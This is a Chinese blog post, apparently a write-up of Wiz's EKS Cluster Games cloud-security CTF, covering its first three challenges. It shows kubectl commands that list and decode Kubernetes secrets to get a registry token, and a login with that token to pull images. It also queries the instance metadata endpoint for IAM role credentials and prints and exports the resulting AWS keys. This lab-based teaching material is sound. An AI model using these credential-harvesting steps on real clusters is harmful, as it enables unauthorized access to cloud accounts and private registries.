<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>从EKS-CTF看云原生安全 · Sally's Blog</title><meta name="description" content="Wiz-eksclustergames国外云安全厂商Wiz举办了“EKS Cluster Games”——一项云安全夺旗 (CTF) 活动。该挑战由五种不同的场景组成，每种场景都侧重于可能的 Amazon EKS 问题。参与者将扮演攻击者，了解这些错误配置和安全问题，然后在受控环境中利用它们。 
1"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>从EKS-CTF看云原生安全</a></h3></div><div class="post-content"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-eksclustergames"><a href="#Wiz-eksclustergames" class="headerlink" title="Wiz-eksclustergames"></a>Wiz-eksclustergames</h1><p>国外云安全厂商Wiz举办了“EKS Cluster Games”——一项云安全夺旗 (CTF) 活动。该挑战由五种不同的场景组成，每种场景都侧重于可能的 Amazon EKS 问题。参与者将扮演攻击者，了解这些错误配置和安全问题，然后在受控环境中利用它们。 </p>
<h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><h3 id="Secret-Seeker-寻找秘密"><a href="#Secret-Seeker-寻找秘密" class="headerlink" title="Secret Seeker 寻找秘密"></a>Secret Seeker 寻找秘密</h3><p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
<h4 id="1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"><a href="#1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）" class="headerlink" title="1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"></a>1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）</h4><p>查看我们的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231229095046674.png" alt="image-20231229095046674"></p>
<p>查看secrets</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets -o yaml</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228131714241.png" alt="image-20231228131714241"></p>
<h2 id="2-第二部分"><a href="#2-第二部分" class="headerlink" title="2. 第二部分"></a>2. 第二部分</h2><p>根据真实事件改编</p>
<p>Wiz在与<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">阿里云</a>和<a target="_blank" rel="noopener" href="https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql">IBM Cloud</a>的合作中成功地使用了该技术来获取内部容器映像并证明对跨租户数据的未经授权的访问。</p>
<h3 id="Registry-Hunt-仓库狩猎"><a href="#Registry-Hunt-仓库狩猎" class="headerlink" title="Registry Hunt 仓库狩猎"></a>Registry Hunt 仓库狩猎</h3><p>A thing we learned during our research: always check the container registries.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>根据上述描述我们知道目标是registry</p>
<h4 id="2-1-查看pod相关信息"><a href="#2-1-查看pod相关信息" class="headerlink" title="2.1 查看pod相关信息"></a>2.1 查看pod相关信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228133920832.png" alt="image-20231228133920832"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@wiz-eks-challenge:~#</span> <span class="string">kubectl</span> <span class="string">get</span> <span class="string">pods</span> <span class="string">-o</span> <span class="string">yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">kubernetes.io/psp:</span> <span class="string">eks.privileged</span></span><br><span class="line">      <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">database-pod-2c9b3a4e</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;12166896&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">57fe7d43-5eb3-4554-98da-47340d94b4a6</span></span><br><span class="line">  <span class="attr">spec:</span></span><br><span class="line">    <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">eksclustergames/base_ext_image</span></span><br><span class="line">      <span class="attr">imagePullPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">terminationMessagePath:</span> <span class="string">/dev/termination-log</span></span><br><span class="line">      <span class="attr">terminationMessagePolicy:</span> <span class="string">File</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/run/secrets/kubernetes.io/serviceaccount</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">        <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirst</span></span><br><span class="line">    <span class="attr">enableServiceLinks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">imagePullSecrets:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">ip-192-168-21-50.us-west-1.compute.internal</span></span><br><span class="line">    <span class="attr">preemptionPolicy:</span> <span class="string">PreemptLowerPriority</span></span><br><span class="line">    <span class="attr">priority:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">    <span class="attr">schedulerName:</span> <span class="string">default-scheduler</span></span><br><span class="line">    <span class="attr">securityContext:</span> &#123;&#125;</span><br><span class="line">    <span class="attr">serviceAccount:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">serviceAccountName:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">30</span></span><br><span class="line">    <span class="attr">tolerations:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/not-ready</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">      <span class="attr">key:</span> <span class="string">node.kubernetes.io/unreachable</span></span><br><span class="line">      <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">tolerationSeconds:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-api-access-cq4m2</span></span><br><span class="line">      <span class="attr">projected:</span></span><br><span class="line">        <span class="attr">defaultMode:</span> <span class="number">420</span></span><br><span class="line">        <span class="attr">sources:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">serviceAccountToken:</span></span><br><span class="line">            <span class="attr">expirationSeconds:</span> <span class="number">3607</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">token</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">configMap:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">ca.crt</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">ca.crt</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">kube-root-ca.crt</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">downwardAPI:</span></span><br><span class="line">            <span class="attr">items:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">fieldRef:</span></span><br><span class="line">                <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">                <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">namespace</span></span><br><span class="line">  <span class="attr">status:</span></span><br><span class="line">    <span class="attr">conditions:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Initialized</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">Ready</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">ContainersReady</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">lastProbeTime:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">lastTransitionTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">      <span class="attr">status:</span> <span class="string">&quot;True&quot;</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">PodScheduled</span></span><br><span class="line">    <span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br><span class="line">          <span class="attr">exitCode:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">finishedAt:</span> <span class="string">&quot;2023-12-07T19:54:25Z&quot;</span></span><br><span class="line">          <span class="attr">reason:</span> <span class="string">Completed</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-11-01T13:32:08Z&quot;</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-container</span></span><br><span class="line">      <span class="attr">ready:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartCount:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">started:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">state:</span></span><br><span class="line">        <span class="attr">running:</span></span><br><span class="line">          <span class="attr">startedAt:</span> <span class="string">&quot;2023-12-07T19:54:26Z&quot;</span></span><br><span class="line">    <span class="attr">hostIP:</span> <span class="number">192.168</span><span class="number">.21</span><span class="number">.50</span></span><br><span class="line">    <span class="attr">phase:</span> <span class="string">Running</span></span><br><span class="line">    <span class="attr">podIP:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">podIPs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">ip:</span> <span class="number">192.168</span><span class="number">.12</span><span class="number">.173</span></span><br><span class="line">    <span class="attr">qosClass:</span> <span class="string">BestEffort</span></span><br><span class="line">    <span class="attr">startTime:</span> <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-分析有价值的信息"><a href="#2-2-分析有价值的信息" class="headerlink" title="2.2 分析有价值的信息"></a>2.2 分析有价值的信息</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imagePullSecrets:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br></pre></td></tr></table></figure>

<p>根据<a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/pull-image-private-registry/">从私有仓库拉取镜像</a>可以知道这个字段配置了该pod将使用一个名为registry-pull-secrets-780bab1d的secret从私有镜像仓库拉取镜像。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">containerStatuses:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">containerID:</span> <span class="string">containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">docker.io/eksclustergames/base_ext_image:latest</span></span><br><span class="line">      <span class="attr">imageID:</span> <span class="string">docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623</span></span><br><span class="line">      <span class="attr">lastState:</span></span><br><span class="line">        <span class="attr">terminated:</span></span><br><span class="line">          <span class="attr">containerID:</span> <span class="string">containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af</span></span><br></pre></td></tr></table></figure>

<p>这一部分告诉了我们容器和镜像的名称和具体ID</p>
<h4 id="2-2-尝试获取secrets信息"><a href="#2-2-尝试获取secrets信息" class="headerlink" title="2.2 尝试获取secrets信息"></a>2.2 尝试获取secrets信息</h4><p>之前在看aqua博客的时候翻到了一个类似的资讯，请见参考文献</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets registry-pull-secrets-780bab1d -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="string">.dockerconfigjson:</span> <span class="string">eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">pulumi.com/autonamed:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T13:31:29Z&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">registry-pull-secrets-780bab1d</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">challenge2</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;897340&quot;</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">1348531e-57ff-42df-b074-d9ecd566e18b</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">kubernetes.io/dockerconfigjson</span></span><br></pre></td></tr></table></figure>

<p>根据之前的学习我知道.dockerconfigjson会存储有私有仓库的auth信息，将其进行base64解密即可。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;auths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;index.docker.io/v1/&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3-登陆仓库并pull镜像"><a href="#2-3-登陆仓库并pull镜像" class="headerlink" title="2.3 登陆仓库并pull镜像"></a>2.3 登陆仓库并pull镜像</h4><h5 id="docker的方式"><a href="#docker的方式" class="headerlink" title="docker的方式"></a>docker的方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br><span class="line">docker pull eksclustergames/base_ext_image:latest</span><br><span class="line">docker run -it eksclustergames/base_ext_image /bin/bash</span><br></pre></td></tr></table></figure>

<p>在工作目录下找到了flag.txt</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228142957530.png" alt="image-20231228142957530"></p>
<h5 id="crane的方式"><a href="#crane的方式" class="headerlink" title="crane的方式"></a>crane的方式</h5><p>先将镜像以tar包方式导出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane <span class="built_in">export</span> 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 test.tar</span><br></pre></td></tr></table></figure>

<p>再解包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf test.tar</span><br></pre></td></tr></table></figure>

<p>就可以看到flag.txt了</p>
<h2 id="3-第三部分"><a href="#3-第三部分" class="headerlink" title="3. 第三部分"></a>3. 第三部分</h2><p>在此挑战中，您从实例元数据服务 (IMDS) 检索了凭据。展望未来，这些凭据将在 Pod 中随时可用，以便您轻松使用。</p>
<h3 id="Image-Inquisition-镜像渗透"><a href="#Image-Inquisition-镜像渗透" class="headerlink" title="Image Inquisition 镜像渗透"></a>Image Inquisition 镜像渗透</h3><p>A pod’s image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.</p>
<p>Remember: You are running inside a compromised EKS pod.</p>
<p>For your convenience, the <a target="_blank" rel="noopener" href="https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md">crane</a> utility is already pre-installed on the machine.</p>
<p>这里参考了腾讯云的一篇文章，根据文章提及的手法进行渗透，请见参考文献部分</p>
<h4 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h4><p>查看所有类别的元数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228150321381.png" alt="image-20231228150321381"></p>
<p>查看所有iam角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228151224987.png" alt="image-20231228151224987"></p>
<p>查看角色的临时凭据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228155616853.png" alt="image-20231228155616853"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span><span class="string">&quot;ASIA2AVYNEVMXAE7X7P7&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-12-28 09:34:59+00:00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SecretAccessKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SessionToken&quot;</span><span class="punctuation">:</span><span class="string">&quot;FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将key信息导入环境变量便于使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXAE7X7P7</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m</span><br></pre></td></tr></table></figure>

